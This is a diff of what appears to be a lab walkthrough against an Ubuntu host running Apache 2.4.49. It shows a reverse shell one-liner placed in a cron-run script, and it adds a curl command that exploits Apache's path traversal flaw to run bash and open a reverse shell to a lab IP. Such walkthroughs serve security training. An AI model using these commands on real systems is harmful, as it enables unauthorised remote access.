@@ -141,8 +141,6 @@ printenv  printenv.vbs	printenv.wsf  test-cgi
 ### Execute and explore binaries
 Try to execute `printenv`
 ```sh
-ftp-user@ubuntulab:~$ ./printenv
--bash: ./printenv: Permission denied
 ftp-user@ubuntulab:~$ printenv
 SHELL=/bin/bash
 PWD=/usr/local/apache24/cgi-bin/
@@ -174,3 +172,9 @@ The crontab was set to execute the health-check.sh every minute (`*/1 * * * *`)
  ```sh
  sh -i >& /dev/tcp/<attacker_machine>/<attacker_port> 0>&1
 ``` 
+
+ # Foothold
+With that version of Apache (2.4.49) misconfigured, we are able to produce a remote code execution via Path Traversal.
+ ```sh
+ curl -s -X POST -d "echo; bash -i >& /dev/tcp/192.168.56.3/9321 0>&1" http://192.168.56.4:8080/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/bash
+ ```
